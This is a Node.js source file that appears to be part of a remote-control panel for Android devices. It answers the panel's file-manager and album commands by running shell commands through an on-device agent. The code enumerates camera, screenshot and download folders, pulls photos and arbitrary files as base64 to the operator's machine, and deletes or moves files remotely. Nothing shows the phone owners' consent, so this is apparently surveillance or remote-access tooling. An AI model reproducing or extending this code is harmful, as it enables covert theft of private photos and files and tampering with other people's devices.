'use strict';

// ---------------------------------------------------------------------------
// Panel WS command bridge (2026-10-09, round 4)
//
// The folder-1 panel drives most controls over HTTP (/m/device/<id>/command ->
// PHP -> dxs), but the 文件管理器 and 相册 tabs talk over the admin WebSocket
// instead and expect device-shaped replies:
//
//   文件: {type:'command',data:{command:'FILE_LIST',payload:{path}}}
//         <- {type:'file_response',data:{path,files:[{name,isDirectory,size,lastModified}]}}
//         <- {type:'file_ready',data:{requestId,name,size}}  (for FILE_DOWNLOAD_HTTP)
//   相册: {type:'command',data:{command:'ALBUM_READ_THUMBNAILS',payload:{thumbnailSize}}}
//         <- {type:'gallery_image_saved',data:{index,total}}
//         <- {type:'gallery_complete'}
//         <- {type:'gallery_original_image',data:{imageData,displayName}}
//
// The APK's /w socket ignores those commands entirely, so the panel used to sit
// on "正在读取相册... 0/0" / "加载中..." forever. This module answers them from
// the dxs agent (GET /listDir, POST /execShell) so the tabs really work.
// ---------------------------------------------------------------------------

const http = require('http');
const fs = require('fs');
const path = require('path');

const DXS_HOST = process.env.DXS_HOST || '127.0.0.1';
const DXS_PORT = Number(process.env.DXS_PORT || 17912);
const DOWNLOAD_DIR = process.env.PANEL_DOWNLOAD_DIR
  || 'C:/Users/Administrator/Desktop/stST/local/cs/public/storage/downloads';
const MAX_PULL_BYTES = Number(process.env.PANEL_MAX_PULL_BYTES || 24 * 1024 * 1024);

const IMAGE_DIRS = [
  '/sdcard/DCIM/Camera',
  '/sdcard/DCIM',
  '/sdcard/Pictures',
  '/sdcard/Pictures/Screenshots',
  '/sdcard/Download',
  '/sdcard/Movies',
  '/storage/emulated/0/DCIM',
];
const IMAGE_RE = /\.(jpe?g|png|gif|webp|bmp|heic)$/i;

const FILE_COMMANDS = new Set([
  'FILE_LIST', 'FILE_CREATE_FOLDER', 'FILE_RENAME', 'FILE_DELETE',
  'FILE_OPEN', 'FILE_COPY', 'FILE_MOVE', 'FILE_DOWNLOAD_HTTP', 'FILE_DOWNLOAD_FROM_SERVER',
]);
const ALBUM_COMMANDS = new Set([
  'ALBUM_READ_THUMBNAILS', 'ALBUM_READ', 'ALBUM_STOP', 'ALBUM_GET_ORIGINAL', 'GET_GALLERY',
]);

const albumCancel = new Map();   // deviceId -> true while a scan was stopped

function log(...a) { console.log('[PanelBridge]', ...a); }

function request(method, p, body, timeoutMs) {
  return new Promise((resolve) => {
    let payload = null;
    if (body !== undefined && body !== null) {
      payload = typeof body === 'string' ? body : JSON.stringify(body);
    }
    const r = http.request({
      host: DXS_HOST, port: DXS_PORT, method, path: p,
      headers: payload ? { 'content-type': 'application/json', 'content-length': Buffer.byteLength(payload) } : {},
    }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, buffer: Buffer.concat(chunks) }));
    });
    r.setTimeout(Number(timeoutMs) || 20000, () => { try { r.destroy(); } catch (e) {} });
    r.on('error', (e) => resolve({ status: 0, buffer: Buffer.from('{"success":false,"error":"x"}') }));
    if (payload) r.write(payload);
    r.end();
  });
}

async function getJson(p) {
  const r = await request('GET', p);
  try { return JSON.parse(r.buffer.toString('utf8')); } catch (e) { return { success: false, error: 'non-json' }; }
}

async function execShell(command, timeoutMs) {
  const r = await request('POST', '/execShell', { command }, timeoutMs || 25000);
  try {
    const j = JSON.parse(r.buffer.toString('utf8'));
    return (j && j.data && typeof j.data.output === 'string') ? j.data.output : '';
  } catch (e) { return ''; }
}

const q = (s) => encodeURIComponent(String(s));
function shq(s) { return "'" + String(s).replace(/'/g, "'\\''") + "'"; }

function joinPath(dir, name) {
  return dir.endsWith('/') ? dir + name : dir + '/' + name;
}

function parseLs(text, dir) {
  const out = [];
  const lines = String(text || '').split('\n');
  for (const raw of lines) {
    const line = raw.replace(/\r$/, '');
    if (!line || /^total\s/i.test(line)) continue;
    const m = line.match(/^([bcdlps-][rwxsStT-]{9}[.+@]?)\s+(\d+)\s+(\S+)\s+(\S+)\s+(\d+)\s+(\S+)\s+(\S+)\s+(.+)$/);
    if (!m) continue;
    const mode = m[1];
    const size = parseInt(m[5], 10) || 0;
    const d1 = m[6], d2 = m[7];
    let name = m[8];
    let target = null;
    const arrow = name.indexOf(' -> ');
    if (arrow >= 0) { target = name.slice(arrow + 4); name = name.slice(0, arrow); }
    if (name === '.' || name === '..' || name === '') continue;
    const isLink = mode[0] === 'l';
    let isDirectory = mode[0] === 'd';
    if (isLink && target) isDirectory = target.endsWith('/');
    let last = 0;
    if (/^\d{4}-\d{2}-\d{2}$/.test(d1)) last = Date.parse(d1 + 'T' + d2) || 0;
    else {
      const year = /^\d{4}$/.test(d2) ? d2 : String(new Date().getFullYear());
      last = Date.parse(d1 + ' ' + d2 + ' ' + year) || 0;
    }
    out.push({ name, isDirectory, isLink, size, lastModified: last, path: joinPath(dir, name) });
  }
  return out;
}

async function listDir(dir) {
  const j = await getJson('/listDir?path=' + q(dir));
  if (!j || j.success !== true || !j.data || typeof j.data.list !== 'string') return [];
  return parseLs(j.data.list, dir);
}

async function collectImages() {
  const seen = new Set();
  const files = [];
  for (const d of IMAGE_DIRS) {
    const items = await listDir(d);
    for (const it of items) {
      if (it.name.charAt(0) === '.') continue;
      if (it.isDirectory) {
        if (it.isLink) continue;                       // avoid Android/data loops
        const sub = await listDir(it.path);
        for (const s of sub) {
          if (s.isDirectory || seen.has(s.path) || !IMAGE_RE.test(s.name)) continue;
          if (s.name.charAt(0) === '.') continue;
          seen.add(s.path); files.push(s);
        }
      } else if (!seen.has(it.path) && IMAGE_RE.test(it.name)) {
        seen.add(it.path); files.push(it);
      }
    }
  }
  return files;
}

function send(conn, obj) {
  if (!conn || !conn.ws || conn.ws.readyState !== 1) return false;
  try { conn.ws.send(JSON.stringify(obj)); return true; } catch (e) { return false; }
}

function looksLikeImage(p) { return IMAGE_RE.test(String(p)); }

async function handleFileList(deviceId, payload, conn) {
  const dir = String(payload.path || '/storage/emulated/0');
  const files = await listDir(dir);
  if (!files.length) {
    const probe = await getJson('/listDir?path=' + q(dir));
    if (!probe || probe.success !== true) {
      send(conn, { type: 'file_response', deviceId, data: { path: dir, error: '读取目录失败: ' + dir } });
      return;
    }
  }
  const list = files.map((f) => ({
    name: f.name, isDirectory: f.isDirectory, size: f.size, lastModified: f.lastModified, path: f.path,
  }));
  send(conn, { type: 'file_response', deviceId, data: { path: dir, files: list, items: list } });
  log('FILE_LIST ' + dir + ' -> ' + list.length);
}

async function handleFileOp(deviceId, cmd, payload, conn) {
  const p = String(payload.path || payload.old_path || '');
  let shell = '';
  if (cmd === 'FILE_CREATE_FOLDER') shell = 'mkdir -p ' + shq(p);
  else if (cmd === 'FILE_RENAME') shell = 'mv -f ' + shq(payload.old_path || p) + ' ' + shq(payload.new_path || '');
  else if (cmd === 'FILE_DELETE') shell = 'rm -rf ' + shq((payload.paths && payload.paths.length ? payload.paths : [p]).map(shq).join(' '));
  else if (cmd === 'FILE_OPEN') shell = 'am start -a android.intent.action.VIEW -d ' + shq('file://' + p);
  else if (cmd === 'FILE_COPY') shell = 'cp -rf ' + shq(payload.src_path || p) + ' ' + shq(payload.dst_path || '');
  else if (cmd === 'FILE_MOVE') shell = 'mv -f ' + shq(payload.src_path || p) + ' ' + shq(payload.dst_path || '');
  const out = shell ? await execShell(shell, 20000) : '';
  send(conn, { type: 'file_op_result', deviceId, data: { command: cmd, path: p, output: out, success: !/error|denied|No such/i.test(out) } });
  if (cmd !== 'FILE_OPEN' && cmd !== 'FILE_DOWNLOAD_HTTP') {
    await handleFileList(deviceId, { path: path.posix.dirname(p) }, conn);
  }
  log(cmd + ' ' + p);
}

async function handleFileDownload(deviceId, payload, conn) {
  const rp = String(payload.path || '');
  const requestId = String(payload.requestId || ('dl-' + Date.now()));
  const out = await execShell('stat -c %s ' + shq(rp), 10000);
  const size = parseInt(String(out).trim(), 10) || 0;
  if (!rp) { send(conn, { type: 'file_ready', deviceId, data: { requestId, error: '缺少路径' } }); return; }
  if (size > MAX_PULL_BYTES) {
    send(conn, { type: 'file_ready', deviceId, data: { requestId, error: '文件过大(' + size + 'B)' } });
    return;
  }
  const b64 = (await execShell('base64 -w0 ' + shq(rp), 90000)).replace(/\s+/g, '');
  if (!b64) { send(conn, { type: 'file_ready', deviceId, data: { requestId, error: '读取失败' } }); return; }
  const buf = Buffer.from(b64, 'base64');
  try {
    fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
    fs.writeFileSync(path.join(DOWNLOAD_DIR, requestId), buf);
    fs.writeFileSync(path.join(DOWNLOAD_DIR, requestId + '.json'),
      JSON.stringify({ name: path.posix.basename(rp), size: buf.length, deviceId, path: rp }));
  } catch (e) { log('download write failed ' + e.message); }
  send(conn, { type: 'file_ready', deviceId, data: { requestId, name: path.posix.basename(rp), size: buf.length } });
  log('FILE_DOWNLOAD_HTTP ' + rp + ' -> ' + buf.length);
}

async function handleAlbumRead(deviceId, conn) {
  albumCancel.set(deviceId, false);
  const files = await collectImages();
  if (albumCancel.get(deviceId)) { send(conn, { type: 'gallery_complete', deviceId, data: { cancelled: true } }); return; }
  const total = files.length;
  send(conn, { type: 'gallery_image_saved', deviceId, data: { index: 0, total, paths: files.slice(0, 60).map((f) => f.path) } });
  if (total > 0) {
    send(conn, { type: 'gallery_image_saved', deviceId, data: { index: total - 1, total } });
  }
  send(conn, { type: 'gallery_complete', deviceId, data: { total } });
  log('ALBUM_READ_THUMBNAILS -> ' + total + ' images');
}

async function handleAlbumOriginal(deviceId, payload, conn) {
  const rp = String(payload.contentUri || payload.path || payload.uri || '');
  if (!rp) { send(conn, { type: 'gallery_error', deviceId, data: { error: '缺少路径' } }); return; }
  const out = await execShell('stat -c %s ' + shq(rp), 10000);
  const size = parseInt(String(out).trim(), 10) || 0;
  if (size > MAX_PULL_BYTES) { send(conn, { type: 'gallery_error', deviceId, data: { error: '图片过大' } }); return; }
  const b64 = (await execShell('base64 -w0 ' + shq(rp), 90000)).replace(/\s+/g, '');
  if (!b64) { send(conn, { type: 'gallery_error', deviceId, data: { error: '读取失败' } }); return; }
  const lower = rp.toLowerCase();
  let mime = 'image/jpeg';
  if (lower.endsWith('.png')) mime = 'image/png';
  else if (lower.endsWith('.gif')) mime = 'image/gif';
  else if (lower.endsWith('.webp')) mime = 'image/webp';
  send(conn, {
    type: 'gallery_original_image', deviceId,
    data: { imageData: 'data:' + mime + ';base64,' + b64, displayName: path.posix.basename(rp), contentUri: rp },
  });
  log('ALBUM_GET_ORIGINAL ' + rp + ' -> ' + b64.length);
}

function tryHandleCommand(deviceId, data, conn, connections) {
  if (!data || typeof data !== 'object') return false;
  const cmd = String(data.command || '').toUpperCase();
  const payload = (data.payload && typeof data.payload === 'object') ? data.payload
    : ((data.params && typeof data.params === 'object') ? data.params : {});
  if (!FILE_COMMANDS.has(cmd) && !ALBUM_COMMANDS.has(cmd)) return false;

  if (cmd === 'ALBUM_STOP') {
    albumCancel.set(deviceId, true);
    send(conn, { type: 'gallery_complete', deviceId, data: { cancelled: true } });
    return true;
  }
  if (cmd === 'ALBUM_GET_ORIGINAL') { handleAlbumOriginal(deviceId, payload, conn).catch(() => {}); return true; }
  if (ALBUM_COMMANDS.has(cmd)) { handleAlbumRead(deviceId, conn).catch((e) => log('album err ' + e.message)); return true; }
  if (cmd === 'FILE_DOWNLOAD_HTTP' || cmd === 'FILE_DOWNLOAD_FROM_SERVER') {
    handleFileDownload(deviceId, payload, conn).catch((e) => log('dl err ' + e.message));
    return true;
  }
  if (cmd === 'FILE_LIST') { handleFileList(deviceId, payload, conn).catch((e) => log('list err ' + e.message)); return true; }
  handleFileOp(deviceId, cmd, payload, conn).catch((e) => log('op err ' + e.message));
  return true;
}

module.exports = { tryHandleCommand, listDir, execShell, collectImages, parseLs, DOWNLOAD_DIR };